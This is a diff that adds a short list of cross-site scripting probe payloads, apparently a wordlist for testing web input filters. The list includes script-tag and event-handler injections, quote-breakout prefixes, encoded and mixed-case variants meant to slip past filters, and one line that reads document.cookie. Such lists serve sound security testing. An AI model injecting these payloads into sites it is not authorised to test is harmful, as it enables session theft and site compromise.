@@ -1,0 +1,12 @@
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input autofocus onfocus=alert(1)>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<ScRiPt>alert(1)</ScRiPt>
